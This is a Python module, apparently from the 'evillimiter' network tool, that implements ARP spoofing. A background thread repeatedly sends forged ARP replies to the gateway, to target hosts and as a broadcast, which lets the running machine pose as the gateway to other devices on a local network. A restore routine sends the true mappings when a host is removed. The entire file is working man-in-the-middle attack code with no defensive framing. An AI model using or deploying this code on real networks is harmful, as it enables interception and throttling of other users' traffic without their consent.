import socket
import time
import threading
from scapy.all import ARP, Ether, sendp # pylint: disable=no-name-in-module

from .host import Host
from evillimiter.common.globals import BROADCAST


class ARPSpoofer(object):
    def __init__(self, interface, gateway_ip, gateway_mac):
        self.interface = interface
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac

        # interval in s spoofed ARP packets are sent to targets (tuned to 1.2s for zero ARP cache flapping)
        self.interval = 1.2

        self._hosts = set()
        self._hosts_lock = threading.Lock()
        self._running = False
        self._stop_event = threading.Event()
        self._socket = None

        if hasattr(socket, 'AF_PACKET'):
            try:
                self._socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
                self._socket.bind((self.interface, 0))
            except Exception:
                self._socket = None

    def add(self, host):
        with self._hosts_lock:
            self._hosts.add(host)

        host.spoofed = True

    def remove(self, host, restore=True):             
        with self._hosts_lock:
            self._hosts.discard(host)

        if restore:
            self._restore(host)

        host.spoofed = False

    def start(self):
        self._stop_event.clear()
        self._running = True

        thread = threading.Thread(target=self._spoof, daemon=True)
        thread.start()

    def stop(self):
        self._running = False
        self._stop_event.set()
        if self._socket:
            try:
                self._socket.close()
            except Exception:
                pass
            self._socket = None

    def _spoof(self):
        while self._running:
            with self._hosts_lock:
                hosts = self._hosts.copy()

            for host in hosts:
                if not self._running:
                    return

                self._send_spoofed_packets(host)
            
            if self._stop_event.wait(timeout=self.interval):
                break

    def _send_spoofed_packets(self, host):
        # 3 packets = 1 gateway unicast, 1 host unicast, 1 broadcast gratuitous packet
        pkg1 = bytes(Ether(dst=self.gateway_mac) / ARP(op=2, psrc=host.ip, pdst=self.gateway_ip, hwdst=self.gateway_mac))
        pkg2 = bytes(Ether(dst=host.mac) / ARP(op=2, psrc=self.gateway_ip, pdst=host.ip, hwdst=host.mac))
        pkg3 = bytes(Ether(dst=BROADCAST) / ARP(op=2, psrc=self.gateway_ip, pdst=host.ip, hwdst=BROADCAST))

        if self._socket:
            try:
                self._socket.send(pkg1)
                self._socket.send(pkg2)
                self._socket.send(pkg3)
                return
            except Exception:
                pass

        # Fallback to Scapy sendp
        packets = [
            Ether(dst=self.gateway_mac) / ARP(op=2, psrc=host.ip, pdst=self.gateway_ip, hwdst=self.gateway_mac),
            Ether(dst=host.mac) / ARP(op=2, psrc=self.gateway_ip, pdst=host.ip, hwdst=host.mac),
            Ether(dst=BROADCAST) / ARP(op=2, psrc=self.gateway_ip, pdst=host.ip, hwdst=BROADCAST)
        ]
        sendp(packets, verbose=0, iface=self.interface)

    def _restore(self, host):
        """
        Remaps host and gateway to their actual addresses
        """
        pkg1 = bytes(Ether(dst=BROADCAST) / ARP(op=2, psrc=host.ip, hwsrc=host.mac, pdst=self.gateway_ip, hwdst=BROADCAST))
        pkg2 = bytes(Ether(dst=BROADCAST) / ARP(op=2, psrc=self.gateway_ip, hwsrc=self.gateway_mac, pdst=host.ip, hwdst=BROADCAST))

        if self._socket:
            try:
                for _ in range(3):
                    self._socket.send(pkg1)
                    self._socket.send(pkg2)
                return
            except Exception:
                pass

        # Fallback to Scapy sendp
        packets = [
            Ether(dst=BROADCAST) / ARP(op=2, psrc=host.ip, hwsrc=host.mac, pdst=self.gateway_ip, hwdst=BROADCAST),
            Ether(dst=BROADCAST) / ARP(op=2, psrc=self.gateway_ip, hwsrc=self.gateway_mac, pdst=host.ip, hwdst=BROADCAST)
        ]
        sendp(packets, verbose=0, iface=self.interface, count=3)